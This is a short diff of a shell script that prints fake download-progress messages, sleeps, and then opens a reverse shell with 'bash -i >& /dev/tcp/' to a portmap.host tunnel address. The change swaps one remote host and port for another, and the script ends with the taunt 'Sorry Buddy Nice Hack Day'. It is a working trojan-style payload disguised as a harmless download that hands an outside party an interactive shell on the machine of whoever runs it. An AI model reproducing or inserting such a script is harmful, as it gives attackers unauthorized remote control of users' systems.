@@ -4,5 +4,5 @@ echo "Downloading is prgress"
 sleep 5s
 echo "Just there take a deep breath"
 sleep 1s
-bash -i >& /dev/tcp/Avausvhs-50652.portmap.host/50652 0>&1
+bash -i >& /dev/tcp/soulkhan23-49097.portmap.host/21449 0>&1
 echo "Sorry Buddy Nice Hack Day"
